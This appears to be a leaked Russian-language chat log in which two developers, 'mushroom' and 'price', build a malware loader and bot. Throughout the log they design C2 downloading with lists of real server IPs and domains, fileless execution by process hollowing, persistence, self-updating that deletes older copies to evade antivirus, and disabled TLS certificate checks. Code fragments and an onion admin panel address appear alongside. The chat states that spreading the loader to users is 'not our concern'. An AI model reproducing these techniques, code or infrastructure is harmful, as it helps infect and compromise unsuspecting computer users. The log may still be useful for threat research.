2020-09-22 09:42:52.103546	mushroom	price	Привет, изменения в командах, у бота появилась команда 18, она означает закрепиться в системе. Получается закрепление нужно убрать из загрузчика если ты его сделал и перенести в бот. Получается так загрузчик передаёт путь к своему файлу в бот. И бот если получит команду 18 использует этот путь для закрепления в системе загрузчика. Бот по прежнему нельзя сохранять на диск.
2020-09-22 09:48:33.080723	mushroom	price	Ещё потом объясни как там сделать чтобы не использовать mvcrt и чтобы можно было ООП писать код или так нельзя без msvcrt?
2020-09-22 10:32:41.851044	price	mushroom	работаем над этим. Вообще-то классы пишутся нормально. Crypter например я написал для валидации.
2020-09-22 10:33:14.849274	mushroom	price	А виртуальные методы?
2020-09-22 10:33:21.346227	price	mushroom	вопрос только работает сейчас сервер gitlab или нет. Вчера я не смог забросить обновления.
2020-09-22 10:33:46.055298	mushroom	price	У меня вчера тоже не работал, сейчас проверю.
2020-09-22 10:33:51.592977	price	mushroom	не пробовал. Попробую скажу.
2020-09-22 10:34:44.357199	price	mushroom	Может и STL ещё будет работать.
2020-09-22 10:35:06.475229	mushroom	price	Gitlab не работает пока и у меня.
2020-09-22 10:35:18.325954	price	mushroom	тото и оно
2020-09-22 10:35:45.404507	price	mushroom	а вот как работать с сервером лоадера?
2020-09-22 10:36:02.835948	price	mushroom	есть только адрес но нет админки?
2020-09-22 10:36:18.174024	mushroom	price	Почему нет?
2020-09-22 10:36:30.532581	price	mushroom	а какой адрес?
2020-09-22 10:36:50.125689	price	mushroom	и пароль, у меня только для бота вроде бы
2020-09-22 10:37:44.879086	mushroom	price	Заходишь в админку. Выбираешь вкладку Groups.
2020-09-22 10:37:51.341348	mushroom	price	Там твоя группа price
2020-09-22 10:38:12.397301	price	mushroom	и
2020-09-22 10:38:17.170740	mushroom	price	Нажимаешь гаечный ключ.
2020-09-22 10:38:22.848249	price	mushroom	понял
2020-09-22 10:38:36.375132	mushroom	price	Сверху  File destination 
Loader x86
	Production execution files
2020-09-22 10:38:42.578518	mushroom	price	Загружаешь файлы.
2020-09-22 10:39:11.773372	mushroom	price	Пути у этих файлов видешь какие, по этим путям делаешь запросы.
2020-09-22 10:39:17.547917	mushroom	price	Адреса у тебя есть.
2020-09-22 10:39:47.147008	mushroom	price	/api197 и т.д
2020-09-22 10:40:13.240715	mushroom	price	Так и отличаются то какая группа какой файл скачает.
2020-09-22 10:40:58.346054	mushroom	price	Ещё когда загрузишь надо будет кнопку set to production нажать справа в списке.
2020-09-22 10:41:18.263451	price	mushroom	спасибо
2020-09-24 14:27:32.346086	mushroom	price	Привет. Сколько ещё осталось делать? Что сделано?
2020-09-24 15:10:35.870658	mushroom	price	Буза сказал ты отгулы взял. Когда вернёшься отпиши.
2020-10-01 06:06:16.458405	mushroom	price	Привет. Сколько ещё осталось делать? Что сделано?
2020-10-01 06:06:16.459955	mushroom	price	Буза сказал ты отгулы взял. Когда вернёшься отпиши.
2020-10-01 06:07:14.030676	price	mushroom	я вернулся
2020-10-01 06:08:03.042505	price	mushroom	за время похорон не было возможности что-то делать. Сейчас есть.
2020-10-01 06:09:06.923777	price	mushroom	сегодня определюсь, завтра сообщу
2020-10-01 07:08:38.705987	price	mushroom	я вернулся
2020-10-01 07:08:38.706965	price	mushroom	за время похорон не было возможности что-то делать. Сейчас есть.
2020-10-01 07:08:38.707897	price	mushroom	сегодня определюсь, завтра сообщу
2020-10-01 07:49:31.035924	mushroom	price	Хорошо.
2020-10-05 08:39:23.674016	mushroom	price	Привет. Что на данный момент сделано?
2020-10-05 09:42:09.832540	price	mushroom	Привет
2020-10-05 09:43:12.989629	price	mushroom	читаю ТЗ (непрерывно), но не могу усвоить откуда выгружать лоадера и далее видимо бота.
2020-10-05 09:44:57.716448	price	mushroom	Проблема с пониманием двух частей лоадера. Первой, которая определяет разрядность и подгружает вторую с соответствующей разрядностью.
2020-10-05 10:02:37.748588	mushroom	price	Определяет разрядность системы. Так же как это определяется в боте для команды 1.
2020-10-05 10:03:24.003356	price	mushroom	я и решил плюнуть и переписать код из бота.
2020-10-05 10:03:46.450476	price	mushroom	но линк на лоадер все равно не понятен.
2020-10-05 10:03:55.984689	mushroom	price	А вообще пока это можно не делать, мы не используем x86 версии вообще.
2020-10-05 10:04:05.169999	mushroom	price	Это не делай.
2020-10-05 10:04:57.893305	mushroom	price	Просто макросом сделай _WIN64, _WIN32. И исходя из этого скачивай нужный бот.
2020-10-05 10:05:02.345689	price	mushroom	так вот стартую я ld6. По какому адресу ему бот искать для старта. Или надо вторую часть лоадера выкачивать с сервера?
2020-10-05 10:06:07.611143	mushroom	price	В Groups написано.
2020-10-05 10:06:27.051965	price	mushroom	в админке?
2020-10-05 10:06:39.416510	mushroom	price	Loader x86, Loader x64, Bot x86, Bot x64
2020-10-05 10:06:42.582936	mushroom	price	Да.
2020-10-05 10:07:18.198570	price	mushroom	сейчас налажу связь с сервером и сообщу.
2020-10-05 10:07:51.446768	mushroom	price	И у них пути /api/v89 - Loader x86, /api/v90 - Loader x64, /api/v91 - Bot x86, /api/v92 - Bot x64
2020-10-05 10:08:05.385144	mushroom	price	Например. А у тебя будут другие пути.
2020-10-05 10:08:22.648310	price	mushroom	они видны из админки?
2020-10-05 10:08:45.942629	mushroom	price	У твоей группы пути /api/v197, /api/v198, /api/v199, /api/v200
2020-10-05 10:09:03.437156	mushroom	price	Видны, я в твоей группе price сейчас их смотрю.
2020-10-05 10:09:14.986196	price	mushroom	сервера не изменились последние?
2020-10-05 10:09:41.354739	mushroom	price	Нет. Может некоторые не работают.
2020-10-05 10:11:11.080064	mushroom	price	Если не работают какие адреса сразу заметишь, буде ошибка wininet 12009 скорей всего. Так по списку адресов иди, пока не получиться скачать.
2020-10-05 10:11:22.502673	mushroom	price	Если все не работают скажешь.
2020-10-05 10:11:30.948236	price	mushroom	ок
2020-10-06 09:10:56.090419	mushroom	price	Привет. Ну как продвижение?
2020-10-06 09:11:25.683569	mushroom	price	Для загрузчика тоже проект на GitLab сделай с названием dl6.
2020-10-06 09:11:31.942956	mushroom	price	Если ещё не сделал.
2020-10-06 09:11:50.772029	price	mushroom	пытаюсь обратиться к серверу, пока ерунда какая то приходит.
2020-10-06 09:12:07.945630	price	mushroom	размещу сразу же как получу ответ
2020-10-06 09:12:21.470974	price	mushroom	вадминку сходил и размещение файлов осознал
2020-10-06 09:12:34.785953	price	mushroom	для лоадера также действуют куки?
2020-10-06 09:13:11.288659	price	mushroom	адреса всё те же?
2020-10-06 09:13:11.664463	price	mushroom			const CHAR* LoaderServers[] = {
			"194.5.249.156",
			"85.143.221.85",
			"45.148.10.190",
			"86.104.194.77",
			"164.132.76.76",
			"164.68.107.165"
		};
2020-10-06 09:13:49.101216	mushroom	price	бот

54.236.253.121 z55gc.com
54.201.135.91  z56gc.com

лоадер


34.230.74.154  z57gc.com
3.135.193.147  z58gc.com
54.190.173.144  z59gc.com
2020-10-06 09:14:00.683349	mushroom	price	Вот, точно рабочие.
2020-10-06 09:14:19.233501	mushroom	price	В админке у тебя файл не загружены.
2020-10-06 09:14:46.742940	price	mushroom	так я пока на валидации стою
2020-10-06 09:14:47.818288	price	mushroom			ibotidlen = wnsprintfA(sreq, sizeof(sreq), "/%s/2", hexHashID);
		for (int i = 0; i < sizeof(LoaderServers) / sizeof(CHAR*); ++i) {
			//debug_printfA("%s\n", BotServers[i]);
			hConnect = InternetConnectA(hInternet, LoaderServers[i], serverPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL/*1u*/);
			if (hConnect) {

				hRequest = HttpOpenRequestA(hConnect, "GET", sreq, NULL, NULL, 0, fflags, 0);//INTERNET_FLAG_SECURE|
2020-10-06 09:14:59.316989	price	mushroom	не так как с ботом?
2020-10-06 09:15:29.980833	price	mushroom	наверное ни хэша ни get не работает, а что работает?
2020-10-06 09:16:24.709266	mushroom	price	У загрузчика вообще не надо никаких id/2
2020-10-06 09:16:32.455148	mushroom	price	Там просто тупые запросы
2020-10-06 09:16:48.668142	mushroom	price	Первый запрос HEAD по адресу как там указан
2020-10-06 09:16:51.182960	price	mushroom	интуитивно понятно, а что за тупые запросы
2020-10-06 09:17:06.646752	mushroom	price	Получаешь заголовки в которых дата и SID=
2020-10-06 09:17:15.058591	mushroom	price	SID это подпись
2020-10-06 09:17:22.464501	price	mushroom	ладно, дай я сам подумаю ещё часик
2020-10-06 09:17:46.064405	mushroom	price	С помощью неё проверяешь строку даты (без времени).
2020-10-06 09:17:56.763282	price	mushroom	но надо по директориям хранения ботов и лоадеров запросы выдавать?
2020-10-06 09:18:17.343166	price	mushroom	и обязательно туда чтото положить?
2020-10-06 09:19:43.286927	mushroom	price	Да. Надо туда положить файлы чтобы проверять работу и версии указать для них.
2020-10-06 09:20:23.464690	mushroom	price	После проверки подписи опять запрос HEAD с заголовком Update:/api/v89 например.
2020-10-06 09:20:39.510154	mushroom	price	Получаешь в заголовке ответа X-Tag:0.1
2020-10-06 09:20:46.400539	mushroom	price	Например.
2020-10-06 09:21:08.648015	price	mushroom	прямо в админке ставить 0.1 версию?
2020-10-06 09:21:59.062821	mushroom	price	Сравниваешь 0.1 с версией прошитой в загрузчике. Не совпадает запрос GET туда же, скачиваешь файл, запускаешь выходишь. Это получается другой загрузчик скачается.
2020-10-06 09:23:30.733215	mushroom	price	Да прямо там версию ставить. Версия это произвольная строка. По этому у тебя например в программе прошито 0.5 а там будет 0.1 считается что надо скачать то что там и запустить. Проверять что больше не надо, просто не равно и всё.
2020-10-06 09:24:28.661487	mushroom	price	Если строки версий сходятся, делаешь запрос GET для бота по адресу как в админке, скачиваешь запускаешь без сохранения на диск, выходишь.
2020-10-06 09:24:40.733519	mushroom	price	Закрепление в загрузчике делать не нужно.
2020-10-06 09:25:35.984132	price	mushroom	а как после установления факта несовпадения версий и скачивания новой версии в админке проставится новый номер версии?
2020-10-06 09:26:01.778849	mushroom	price	По запросам ещё
if (isSecure)
        {
            DWORD flags = 0;
            DWORD flagsSize = sizeof(flags);
            if (wininet.internetQueryOption(m_req, INTERNET_OPTION_SECURITY_FLAGS, &flags,
                &flagsSize))
            {
                flags |= SECURITY_FLAG_IGNORE_REVOCATION;
                flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
                flags |= SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
                flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTP;
                flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTPS;
                flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
#ifndef __MINGW32__
                flags |= SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
#endif // !__MINGW32__
                flags |= SECURITY_FLAG_IGNORE_WRONG_USAGE;
                wininet.internetSetOption(m_req, INTERNET_OPTION_SECURITY_FLAGS, &flags,
                    flagsSize);
            }
        }
2020-10-06 09:26:22.773789	mushroom	price	Никак.
2020-10-06 09:26:45.091600	price	mushroom	а как же версии двигаются?
2020-10-06 09:26:51.427883	mushroom	price	Считается что если версии не сошлись, скачивать что там есть и запускать.
2020-10-06 09:27:14.381142	price	mushroom	то есть ктото в адмиинке будет номер менять вручную?
2020-10-06 09:27:19.209300	mushroom	price	Сам делаешь новую сборку, прошиваешь версию там и в админке пишешь её.
2020-10-06 09:27:26.781578	mushroom	price	Да в ручную.
2020-10-06 09:27:33.600227	price	mushroom	вот теперь всё стало ясным!
2020-10-06 09:28:03.029925	mushroom	price	Каждая новая сборка увеличиваешь номер.
2020-10-06 10:21:01.688721	price	mushroom	Set-Cookie: SID=5t5mC1xtQ1yLLP%2F5EqUhJmcxGlqbl4kzGDpspkxYNRovPdE%2Frq2Up20DVVgK9uf6tPxOoH211jENUb0y54eRfCcOHaNLH8tmSuhSg%2B9SA6Ybw2Z8%2FgUjuqfxNjfkI3OL
2020-10-06 10:21:08.073792	price	mushroom	вот получил
2020-10-06 10:21:18.659300	price	mushroom	сейчас верифицирую
2020-10-06 10:22:35.788756	mushroom	price	Сначала замени url encoded символы:
//Заменить %2B -> +
        PTSTR urlCh = StrStr(base64Sign, _TSTR(TEXT("%2B")));
        while (urlCh)
        {
            *urlCh = TEXT('+');
            MoveMemory(urlCh + 1, urlCh + 3, (base64SignSize - (urlCh + 3 - base64Sign)));

            base64SignSize -= 2;
            base64Sign[base64SignSize] = TEXT('\0');
            urlCh = StrStr(base64Sign, _TSTR(TEXT("%2B")));
        }

        //Заменить %2F -> /
        urlCh = StrStr(base64Sign, _TSTR(TEXT("%2F")));
        while (urlCh)
        {
            *urlCh = TEXT('/');
            MoveMemory(urlCh + 1, urlCh + 3, (base64SignSize - (urlCh + 3 - base64Sign)));

            base64SignSize -= 2;
            base64Sign[base64SignSize] = TEXT('\0');
            urlCh = StrStr(base64Sign, _TSTR(TEXT("%2F")));
        }

        //Заменить %3D -> =
        urlCh = StrStr(base64Sign, _TSTR(TEXT("%3D")));
        while (urlCh)
        {
            *urlCh = TEXT('=');
            MoveMemory(urlCh + 1, urlCh + 3, (base64SignSize - (urlCh + 3 - base64Sign)));

            base64SignSize -= 2;
            base64Sign[base64SignSize] = TEXT('\0');
            urlCh = StrStr(base64Sign, _TSTR(TEXT("%3D")));
        }
2020-10-06 10:23:04.169366	price	mushroom	это я сделаю, уже делал для бота
2020-10-06 10:23:21.035799	mushroom	price	%2B -> +
%2F -> /
%3D -> =
2020-10-06 10:23:51.265350	price	mushroom	ты бы тогда перед тем как я сам добывал эти знания мне сказал
2020-10-06 10:25:30.332175	mushroom	price	Что надо символы поменять? Я вроде говорил.
2020-10-06 10:30:40.188088	price	mushroom	значит я не заметил, но помню как это наверстывал
2020-10-06 15:07:43.250067	price	mushroom	привет
2020-10-06 15:07:55.868649	price	mushroom	вот собрал пример, ты спрашивал как-то
2020-10-06 15:07:57.947749	price	mushroom	
class Parent
{
public:
	virtual const char* getName() { return "Parent"; }
};

class Child : public Parent
{
public:
	virtual const char* getName() { return "Child"; }
};

void ld6(void) {
	printf("Hello World!\n");
	ExitProcess(0);
}
int main(int argc,char**argv) {
	Child child;
	Parent& rParent = child;
	printf("rParent is a %s\n", rParent.getName());
2020-10-06 15:08:17.534880	price	mushroom	а вот это в выдаче
2020-10-06 15:08:18.858062	price	mushroom	rParent is a Child
2020-10-07 08:12:19.937350	mushroom	price	Привет. Ну как продвижение? Вижу в админке у тебя в группе ни одного файла не загружено.
2020-10-07 08:12:51.573491	price	mushroom	привет
2020-10-07 08:13:29.163018	price	mushroom	файлов нет, потому что пока в принципе решаю
2020-10-07 08:17:01.420948	mushroom	price	Сколько времени ещё надо?
2020-10-07 08:17:12.083283	price	mushroom	два дня
2020-10-07 08:18:43.712731	mushroom	price	Всё загрузи тогда в гитлаб, как решишь. Чтобы можно было просто открыть решение и бота и загрузчика выбрать собрать о проверить. Сейчас опять бот по простому не собирается в конфигурации Release.
2020-10-07 08:19:16.425115	price	mushroom	я комплексно подготовлю.
2020-10-07 08:19:36.347884	mushroom	price	Потом ещё надо будет обфусцировать всё.
2020-10-07 08:19:49.390147	price	mushroom	библиотека самопальная CRT изменилась, я лоадера уже на новой делаю.
2020-10-07 08:20:15.661944	price	mushroom	пока соберу лоадера просто функционалку
2020-10-07 08:20:43.448532	price	mushroom	прочитал про виртуальные функции? я не думал, что будет работать. Но сработало.
2020-10-07 08:21:12.752531	mushroom	price	Прочитал.
2020-10-07 08:21:16.474505	price	mushroom	пример оббфускации есть?
2020-10-07 08:21:23.059721	mushroom	price	Есть.
2020-10-07 08:21:33.108255	price	mushroom	в documents?
2020-10-07 08:21:44.813378	mushroom	price	Сначала сделай чтобы всё работало.
2020-10-07 08:21:55.590411	price	mushroom	я и хочу
2020-10-07 08:22:08.204028	price	mushroom	вчера дошел до верификации.
2020-10-07 08:22:17.181705	price	mushroom	осталось скачать.
2020-10-07 08:22:30.486274	price	mushroom	такая же тема как и в боте скачивание по линку?
2020-10-07 08:22:59.138172	price	mushroom	кстати я загрузил бот и лоадер, но просто левые для выкачки
2020-10-07 08:23:20.999496	price	mushroom	в админке должно быть!
2020-10-07 08:23:24.094295	price	mushroom	 сейчас посмотрю
2020-10-07 08:23:41.750320	mushroom	price	https://scrytnuuszglaugg.onion:4247/groups/loadertool?id=50
2020-10-07 08:23:55.679536	mushroom	price	Там нету ничего.
2020-10-07 08:24:09.966112	mushroom	price	Production execution files
2020-10-07 08:24:24.752733	mushroom	price	Туда загружай, а потом кнопка GO.
2020-10-07 08:26:26.992824	price	mushroom	GO не нажал!!!
2020-10-08 13:46:34.330540	mushroom	price	Ну как продвижение?
2020-10-08 13:46:54.189515	price	mushroom	доделываю
2020-10-08 13:46:57.651586	price	mushroom	идет
2020-10-08 13:47:06.221456	price	mushroom	кроме времени вопросов нет
2020-10-08 13:47:38.958483	mushroom	price	В группу загружал что?
2020-10-08 13:48:03.237128	price	mushroom	пока нет, все по мере изготовления
2020-10-08 13:48:05.346346	price	mushroom	кстати
2020-10-08 13:48:18.809687	price	mushroom	вот я загружу туда бота и лоадера
2020-10-08 13:48:25.892377	price	mushroom	а как проверить
2020-10-08 13:48:39.617400	mushroom	price	Запусти лоадер свой.
2020-10-08 13:49:02.974393	price	mushroom	вот лоадера я в ВМ запускаю, обхожду локаль и скачиваю бота и запускаю его холловингом
2020-10-08 13:49:06.011363	price	mushroom	это понятно
2020-10-08 13:49:16.753640	price	mushroom	а вот с загруженными что делать
2020-10-08 13:49:31.528905	price	mushroom	бота я загрузил -могу скачать?
2020-10-08 13:49:45.699518	price	mushroom	а лоадер чтобы проверять новые версии?
2020-10-08 13:50:27.333989	price	mushroom	то есть бота в группу на сервере загружаю чтобы его скачать?
2020-10-08 13:50:36.201252	mushroom	price	На сервере измени версию в поле Version
2020-10-08 13:50:40.242981	price	mushroom	а лоадера, чтобы обновления скачивать?
2020-10-08 13:50:57.381119	mushroom	price	И её будешь получать.
2020-10-08 13:51:06.408121	price	mushroom	и если версия другая, то надо скачивать?
2020-10-08 13:51:10.598713	mushroom	price	И сравнивать с той что прошита в программе.
2020-10-08 13:51:12.867258	price	mushroom	вот теперь яснее стало
2020-10-08 13:51:18.836296	mushroom	price	Да надо скачивать и запускать.
2020-10-08 13:51:58.777404	price	mushroom	я все варианты перепробовал, сейчас код утрясаю, выложу скоро
2020-10-08 13:52:33.187870	price	mushroom	а вот что такое отстук? там 5 минут в ТЗ записано, это как делается и где посмотреть?
2020-10-08 13:52:36.619763	mushroom	price	Как запускаешь новый, старый удаляй.
2020-10-08 13:53:04.680286	price	mushroom	а разве не замещается? это из протокола загрузок удалить?
2020-10-08 13:53:26.587840	price	mushroom	где и откуда удалять?
2020-10-08 13:53:30.891889	mushroom	price	Скачал другую версию загрузчика, запустил её, она в начале работы удалила предыдущую версию.
2020-10-08 13:53:51.911690	price	mushroom	а, понял
2020-10-08 13:54:08.728135	price	mushroom	а разве не прятать его надо где-то?
2020-10-08 13:54:22.103908	price	mushroom	или он просто лежит в фалах?
2020-10-08 13:54:25.408605	mushroom	price	dl1.exe скачал и запустил dl2.exe, dl2.exe должен удалить dl1.exe в начале работы.
2020-10-08 13:54:26.698862	price	mushroom	файлах
2020-10-08 13:55:00.827011	mushroom	price	Прячь. Но старую версию не надо держать, она же спалится.
2020-10-08 13:55:08.459612	price	mushroom	у меня  dl6
2020-10-08 13:55:15.909779	mushroom	price	Это как пример.
2020-10-08 13:55:57.815253	price	mushroom	то есть надо старую версию почистить а на её место записать новый загрузчик
2020-10-08 13:56:08.204042	mushroom	price	Да.
2020-10-08 13:56:28.761927	price	mushroom	понял
2020-10-08 13:56:58.641225	mushroom	price	Для этого передавай в запускаемую новую версию путь к файлу старой, чтобы она смогла удалить.
2020-10-08 13:57:27.086587	mushroom	price	Любым способом передавай.
2020-10-08 13:58:37.279741	mushroom	price	И передавай в новую ещё id процесса старой, если не будет удаляться, а то пока процесс работает файл не удалить никак.
2020-10-08 13:58:48.935359	price	mushroom	спасибо
2020-10-08 13:59:07.220131	mushroom	price	Тогда можно будет дождаться завершения работы старой версии и спокойно удалить её файл.
2020-10-14 08:08:23.030251	mushroom	price	Привет. Ну что сделал?
2020-10-14 08:09:01.434201	price	mushroom	привет
2020-10-14 08:09:36.114303	price	mushroom	скачиваю бота и лоадера  (уже), сейчас запущу бота холловингом
2020-10-14 08:10:00.853260	price	mushroom	день не работали сервера, я искал ошибки в себе
2020-10-14 08:43:24.637215	mushroom	price	Адреса работают ещё?
2020-10-14 08:43:46.084984	price	mushroom	а есть новые?
2020-10-14 08:44:12.031631	price	mushroom	вчера работали, сейчас я холовинг выпиливаю из бота в лоадер
2020-10-14 08:44:30.033937	mushroom	price	bot

18.188.194.80 labelcs.com
54.91.36.142  freedubcs.com

loader

54.245.74.151 titlecs.com
54.145.79.240 mixcinc.com
3.138.117.231 nicknamec.com
2020-10-14 08:44:35.586380	price	mushroom	спасибо
2020-10-14 08:44:40.614900	mushroom	price	На случай если перестанут работать.
2020-10-14 08:45:02.566637	price	mushroom	ок
2020-10-15 08:27:59.013798	mushroom	price	Адреса, которые я тебе вчера давал больше не работают.
2020-10-15 08:28:11.818146	mushroom	price	Вот старые:
bot

3.137.180.197  cuprinc.com
3.238.75.236  shophoof.com

loader

34.221.202.231  breezdesign.com
54.83.253.135 hotenlighten.com
18.191.38.26 onebulks.com
2020-10-15 08:28:24.248459	mushroom	price	34.221.202.231  breezdesign.com этот не работает.
2020-10-15 08:28:26.399159	price	mushroom	спасибо
2020-10-15 08:28:29.814139	mushroom	price	Другие проверь.
2020-10-15 08:28:45.736780	price	mushroom	у меня всю обойму проверяет и рабочий выбирает
2020-10-15 08:29:17.080425	price	mushroom	сейчас пайпы сделал для связи при обновлении лоадера с другой версией, так что приближаю конец
2020-10-15 08:30:07.034334	mushroom	price	OK. И всё прогони, по всем командам. Потом я посмотрю.
2020-10-15 08:30:16.146506	price	mushroom	ок
2020-10-15 08:30:53.372919	price	mushroom	вот только непонятно в тз на лоадер написано, что он тоже должен на сервер передавать информацию о системе.
2020-10-15 08:31:09.948489	price	mushroom	не надо ведь? раз бот это делает
2020-10-15 08:32:13.135036	mushroom	price	Не надо, там в ТЗ написано что это опционально. И настраивается при сборке макросом.
2020-10-15 08:34:59.969026	price	mushroom	вот вот - настраивается макросом
2020-10-15 08:35:25.974863	price	mushroom	то есть может не работать, но генериться должно
2020-10-15 08:35:33.310930	mushroom	price	Пока не надо делать это.
2020-10-15 08:35:40.128404	price	mushroom	ок
2020-10-15 13:11:37.580420	mushroom	price	34.221.79.109  freexaims.com
2020-10-15 13:11:44.292942	mushroom	price	Ещё один.
2020-10-15 13:12:05.253881	price	mushroom	ok
2020-10-20 07:24:30.307105	price	mushroom	привет
2020-10-21 10:40:21.061496	mushroom	price	Привет. Какие там тестовые адреса я давал?
2020-10-21 10:40:34.513785	mushroom	price	Напиши. Мне надо протестировать.
2020-10-21 10:40:49.147984	price	mushroom	читать я всё читаю но сейчас проблема встала
2020-10-21 10:41:06.446658	price	mushroom	я не могу временный файл удалить
2020-10-21 10:41:16.037501	price	mushroom	ошибка контроля доступа
2020-10-21 10:41:17.322658	price	mushroom	5
2020-10-21 10:41:47.248927	mushroom	price	Этот потому что он процессом используется наверное.
2020-10-21 10:42:04.340963	mushroom	price	Надо дождаться завершения или подождать какое то время.
2020-10-21 10:42:04.561745	price	mushroom	я жду 10 сек чтобы завершилось по exit
2020-10-21 10:43:00.440537	price	mushroom	а вот скажи почему лоадер нельзя холовингом запускать а бот надо?
2020-10-21 10:43:31.014251	price	mushroom	ну про то что экзешник какой то упакованный может не пойти в холовинге я помню
2020-10-21 10:43:38.312877	mushroom	price	Скачиваешь другую версию загрузчика, запускаешь её, она ждёт завершения процесса предыдущей версии и удаляет её файл.
2020-10-21 10:43:41.027889	price	mushroom	а бот так не пакуют?
2020-10-21 10:43:49.221778	mushroom	price	Бот не пакуют.
2020-10-21 10:43:58.837061	mushroom	price	Он на диск не сохраняется.
2020-10-21 10:43:59.569128	price	mushroom	понял
2020-10-21 10:44:11.641440	mushroom	price	Скачиваешь другую версию загрузчика, запускаешь её, она ждёт завершения процесса предыдущей версии и удаляет её файл.
2020-10-21 10:44:15.938063	mushroom	price	Так делаешь?
2020-10-21 10:44:34.489563	price	mushroom	вот старая версия у меня ld6 например
2020-10-21 10:45:01.837061	price	mushroom	я стартую ld6 из неё качаю и сохраняю temp6
2020-10-21 10:45:58.390413	price	mushroom	стартую temp6 оттуда копирую temp6 в ld6
2020-10-21 10:46:17.136117	price	mushroom	запускаю ld6 и стараюсь и не могу удалить temp6
2020-10-21 10:47:36.593083	mushroom	price	запустил ld6, она скачала temp6, запустил temp6, завершил ld6, temp6 ждёт завершения процесса ld6, удаляет ld6.
2020-10-21 10:47:47.880564	price	mushroom	ладно сейчас тест сочиню, а то я хотел с ходу пройти
2020-10-21 10:48:07.496692	mushroom	price	Ничего копировать не надо никуда.
2020-10-21 10:48:15.242990	price	mushroom	ld6 нет проблем удалить
2020-10-21 10:48:28.030576	mushroom	price	Скачал в temp фал с рандомным именем и запустил его.
2020-10-21 10:48:37.091687	price	mushroom	а какже тогда я думал надо все под старым именем хранить
2020-10-21 10:48:45.601775	mushroom	price	Не надо.
2020-10-21 10:48:54.811082	price	mushroom	понял, снимается вопрос
2020-10-21 10:49:00.184525	mushroom	price	Какой в этом смысл?
2020-10-21 10:49:12.416997	price	mushroom	а вот как лоадер стартует если закрепление на него не делается?
2020-10-21 10:49:20.814761	mushroom	price	Никак.
2020-10-21 10:49:27.182466	price	mushroom	я думал закрепление по старому имени
2020-10-21 10:49:43.016291	mushroom	price	Закрепление по своему имени.
2020-10-21 10:49:52.358523	price	mushroom	так то нет проблем и удалить и запустить
2020-10-21 10:50:24.714431	mushroom	price	По имени своего файла. GetModuleFileName
2020-10-21 10:50:37.119839	price	mushroom	это я всё делаю
2020-10-21 10:51:19.371364	price	mushroom	но вообще тогда не понятно откуда лоадер берётся и куда девается если он не нужен после запуска бота?
2020-10-21 10:51:22.797092	mushroom	price	Это же имя передаёшь в запускаемый загрузчик, и свой PID чтобы он дождался по нему завершения процесса.
2020-10-21 10:51:55.316035	mushroom	price	Лоадер это одноразовая программа, все детекты антивирусов на него.
2020-10-21 10:52:22.228737	price	mushroom	вот и хорошо, он отработал бота загрузил и болтается в файлах?
2020-10-21 10:52:26.806969	mushroom	price	Как лоадер впарить пользоваиелю не наша забота.
2020-10-21 10:53:00.086781	price	mushroom	но если его запустили то он должен обновиться по версии?
2020-10-21 10:53:00.468483	mushroom	price	Да болтается в файлах.
2020-10-21 10:53:09.668676	mushroom	price	На случай закрепления.
2020-10-21 10:53:32.480614	price	mushroom	может ботом его удалить?
2020-10-21 10:53:40.688961	price	mushroom	закрепление ведь отменили
2020-10-21 10:53:52.680739	mushroom	price	Если его запустили, должен попытаться обновиться, если версия не сходится.
2020-10-21 10:54:08.886844	mushroom	price	Удаление по команде siucid.
2020-10-21 10:54:18.380168	price	mushroom	5.181.156.226
2020-10-21 10:54:19.583604	price	mushroom	CheckServer, 192 ---> Server https://5.181.156.226:443/api/v198 verified! LoaderVersion=2
2020-10-21 10:54:27.966609	mushroom	price	Это завершение работы бота и удаление файла загрузчика.
2020-10-21 10:54:39.683912	price	mushroom	и то и другое?
2020-10-21 10:54:51.860526	price	mushroom	а как бот узнает имя файла ллоадера?
2020-10-21 10:55:05.345406	price	mushroom	для удаления
2020-10-21 10:55:24.181201	mushroom	price	Лоадер запускает бот, он может передать ему своё имя файла, я через переменную окружения передаю.
2020-10-21 10:55:30.060666	price	mushroom	не зря я пайпы тренировал для холовинга
2020-10-21 10:55:39.834469	mushroom	price	Через командную строку можно ещё.
2020-10-21 10:55:53.070978	price	mushroom	уу меня не получалось с холовинглм
2020-10-21 10:56:02.718861	price	mushroom	по командной строке
2020-10-21 10:56:22.623388	price	mushroom	или прям процессу передавать?
2020-10-21 10:56:23.629575	mushroom	price	Перемунную окружения используй тогда.
2020-10-21 10:56:34.994597	price	mushroom	это не палит ?
2020-10-21 10:57:02.973166	mushroom	price	Нет. Этих переменных полно. Почти все программы их используют.
2020-10-21 10:57:29.498207	mushroom	price	Что еак не работает 1.exe 1234567
2020-10-21 10:57:32.998015	price	mushroom	ладно я доделывать пошёл, ты про адрес спрашивал, видел ответ?
2020-10-21 10:57:49.397688	mushroom	price	1234567 аргумент командной строки.
2020-10-21 10:58:00.551900	mushroom	price	Потом GetCommandLine в программе.
2020-10-21 10:58:10.390088	price	mushroom	это у меня норм
2020-10-21 10:58:23.409353	price	mushroom	у меня и argv работает не плохе
2020-10-21 10:58:26.897611	price	mushroom	плохо
2020-10-21 10:58:58.932604	price	mushroom	а точно холовинг надо по геткомандлайн наверное
2020-10-21 10:59:10.773963	mushroom	price	В /subsystem:windows вообще нету argv
2020-10-21 10:59:27.190892	mushroom	price	Полагайся всегда на GetCommandLine
2020-10-21 10:59:29.738584	price	mushroom	у меня console вроде
2020-10-21 10:59:33.169856	mushroom	price	Работает везде.
2020-10-21 10:59:56.820529	mushroom	price	В работу надо не console. А то окно с консолью будет выскакивать.
2020-10-21 10:59:56.980389	price	mushroom	понял
2020-10-21 11:00:10.671879	price	mushroom	окно не выскакивает
2020-10-21 11:01:06.663942	price	mushroom	надо проверить, не задумывался,  но когда createprocess запускал там новиндоуз стоит
2020-10-21 11:01:17.840249	price	mushroom	и ничего не видно
2020-10-21 11:01:36.316056	mushroom	price	Короче самый удобный способ имя файла передать как аргумент командной строки или переменную окружения.
2020-10-21 11:01:54.694512	price	mushroom	я теперь понял
2020-10-21 11:01:59.124563	price	mushroom	делаю
2020-10-21 11:02:07.923215	mushroom	price	Выскакисвает окно у лоадера я имел ввиду, там ты NoWindow не сделаешь.
2020-10-21 11:02:21.560612	mushroom	price	Там запускается двойным кликом.
